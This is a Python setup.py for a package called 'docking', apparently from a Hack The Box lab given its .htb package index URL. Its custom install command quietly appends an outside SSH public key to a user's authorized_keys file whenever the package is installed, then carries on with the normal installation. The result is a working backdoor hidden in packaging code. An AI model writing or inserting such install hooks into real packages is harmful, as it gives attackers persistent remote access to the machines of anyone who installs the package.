from setuptools import setup
from setuptools.command.install import install


class CustomInstall(install):
  def run(self):
    print("RUNNING")
    with open("/home/low/.ssh/authorized_keys", "a+") as f:
        f.write("ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC4B6NBeW9e4Mdg2MC7E3OPFnPEdhnuci3lTVXO9rdsMC7gi7t1rGihwjc1FOAUbuXpQou/JUN9L3yCzzbTbG79FOZZjqZPqi/waltp6HonUQUkBB4Klby0zkQIus3hjNWRkKgtWi/nJJ6sUd4+KZu7cQeigYPV2r+cEO2D3aSkkWQ9pqOGpAT4P8Sr72O1iEl3ZnQc3/Gw15vzUTiwUV/xk8gZdjjAOm+yzjv3UXneZXBSR8cMT7KEdf+vALav8pX5cWyPtt94581CWrPTv/TctOJeQenYMk8hTM/Ypj6LXYzdFKLV68zct0/qSNoTd+FG/axy7sc8mjgOEVTnqNjH limitedeternity@Marises-MacBook.local")
    install.run(self)

setup(name='docking',
      version='0.0.1',
      url='https://pypi.sneakycorp.htb/docking',
      author='zc00l',
      author_email='andre.marques@esecurity.com.br',
      license='MIT',
      zip_safe=False,
      cmdclass={'install': CustomInstall})
